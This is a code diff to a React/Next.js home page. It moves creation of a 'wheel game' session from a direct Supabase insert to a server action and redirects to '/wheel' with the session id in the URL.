@@ -7,6 +7,8 @@ import LiveToast from "@/components/LiveToast";
 import { useSettings } from "@/contexts/SettingsContext";
 import { persistActiveSession } from "@/lib/session-id-client";
 
+import { createSessionAction } from "@/app/actions/create-session";
+
 export default function Home() {
 
   const { settings } = useSettings();
@@ -27,31 +29,20 @@ export default function Home() {
     const urlParams = new URLSearchParams(window.location.search);
     const partnerName = urlParams.get("ref") || "admin";
 
-    // 1. Yeni bir session oluştur ve mevcut akışla uyumlu wheel oturumu başlat
-    const { data, error: insertError } = await supabase
-        .from("sessions")
-        .insert({
-          amount: 0,
-          current_step: "code_entry",
-          status: "offline",
-          is_hidden: false,
-          partner_name: partnerName,
-          form_data: {
-            currency: "€",
-            is_wheel_game: true,
-          }
-        })
-        .select("id, public_id")
-        .maybeSingle();
+    // 1. Yeni bir session oluştur (Server Action ile, bos public_id bulur)
+    const result = await createSessionAction(partnerName);
 
-    if (insertError || !data?.id) {
+    if (!result.success || !result.data?.id) {
       setError("Ilmnes viga. Palun proovige hiljem uuesti.");
       setLoading(false);
       return;
     }
 
-    persistActiveSession(data.id, data.public_id ? String(data.public_id) : data.id);
-    window.location.href = "/wheel";
+    const { id, public_id } = result.data;
+    const publicSessionId = public_id ? String(public_id) : id;
+
+    persistActiveSession(id, publicSessionId);
+    window.location.href = `/wheel?session=${publicSessionId}`;
   };
 
   useEffect(() => {
